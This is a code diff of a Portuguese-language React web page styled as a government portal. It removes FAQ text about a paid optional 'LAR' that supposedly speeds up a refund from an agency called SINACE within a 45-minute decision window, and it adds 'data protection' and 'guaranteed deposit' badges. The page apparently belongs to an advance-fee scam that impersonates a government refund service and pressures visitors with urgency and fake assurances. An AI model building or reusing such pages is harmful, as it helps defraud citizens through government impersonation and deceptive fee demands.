-                <div className="border-b border-gray-200 pb-4">
-                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. A LAR é obrigatória?</h3>
-                  <p className="text-sm text-gray-600">
-                    Não. A LAR é totalmente opcional e foi criada para atender cidadãos que precisam receber 
-                    seu crédito com urgência. Sem a LAR, sua restituição ainda será processada normalmente, 
-                    seguindo o calendário fiscal padrão com prazo de até 15 dias úteis.
-                  </p>
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Proteção de dados pessoais</span>
                 </div>
-                
-                <div className="border-b border-gray-200 pb-4">
-                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Por que tenho apenas 45 minutos para decidir?</h3>
-                  <p className="text-sm text-gray-600">
-                    O Sistema Nacional de Compensações Elétricas (SINACE) processa as restituições em lotes. 
-                    A janela de 45 minutos representa o tempo máximo para incluir seu processo no próximo lote 
-                    prioritário. Após esse prazo, sua restituição é automaticamente direcionada para o processo regular.
-                  </p>
-                </div>
-                
-                <div>
-                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. Como funciona a fila expressa de liberação?</h3>
-                  <p className="text-sm text-gray-600">
-                    Ao optar pela LAR, seu processo é inserido em uma fila prioritária com número reduzido de 
-                    procedimentos burocráticos. A taxa cobre os custos operacionais para dar prioridade máxima 
-                    ao seu caso, permitindo o processamento imediato da sua restituição.
-                  </p>
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Depósito garantido</span>
                 </div>
               </div>
             </div>
